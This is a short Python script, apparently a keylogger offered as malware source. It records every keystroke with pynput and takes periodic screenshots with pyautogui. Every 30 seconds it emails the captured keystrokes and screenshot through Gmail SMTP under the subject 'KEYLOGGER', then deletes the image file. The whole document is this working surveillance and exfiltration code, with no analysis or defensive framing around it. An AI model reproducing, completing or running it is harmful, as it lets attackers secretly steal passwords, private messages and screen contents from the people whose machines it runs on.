#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
import pyautogui
import tempfile
import os
class capture_words:
    def __init__(self,e_mail,password):
        self.log=""
        self.e_mail=e_mail
        self.password=password
    def take_screenshot(self):
        temp_folder=tempfile.gettempdir()
        os.chdir(temp_folder)
        pyautogui.screenshot("resim.png")
    def process_key_press(self,key):
        try:
            self.log+=str(key.char)
        except AttributeError:
            if key==key.space:
                self.log+=str(" [pressed-space] ")
            elif key==key.alt or key==key.alt_l:
                self.log+=str(" [pressed-alt] ")
            elif key==key.enter:
                self.log+=str(" [pressed-enter] ")
            elif key==key.esc or key==esc_l:
                self.log+=str(" [pressed-esc] ")
            elif key==key.tab or key==key.tab_l:
                self.log+=str(" [pressed-tab] ")
            elif key==key.backspace:
                self.log+=str(" [pressed-backspace] ")
            elif key==key.ctrl:
                self.log+=str("  [pressed-ctrl] ")
            elif key==key.ctrl_l:
                self.log+=str(" [pressed-ctrl] ")
            else:
                self.log=self.log+str(key)+" "
    def report(self):
        try:
            self.take_screenshot()
            self.send_mail(self.e_mail,self.password,self.log)
            os.system("del resim.png")
            timer=threading.Timer(30,self.report)
            timer.start()   
        except UnicodeEncodeError:
            self.log=self.log.encode("utf-8")
            self.take_screenshot()
            self.send_mail(self.e_mail,self.password,self.log)
            os.system("del resim.png")
            timer=threading.Timer(30,self.report)
            timer.start()
            
    def send_mail(self,e_mail,password,mesaj):
        message=MIMEMultipart()
        message["From"]=e_mail
        message["To"]=e_mail
        message["Subject"]="KEYLOGGER"
        message.attach(MIMEText(mesaj,"plain"))
        filename="resim.png"
        attachmend=open(filename,"rb")
        part=MIMEBase("application","octet-stream")
        part.set_payload((attachmend).read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition","attachmend;filename="+filename)
        message.attach(part)

        text=message.as_string()
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(e_mail,password)
        server.sendmail(e_mail,e_mail,text)
        server.quit()
    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
c_words=capture_words(e_mail,password)
c_words.start()
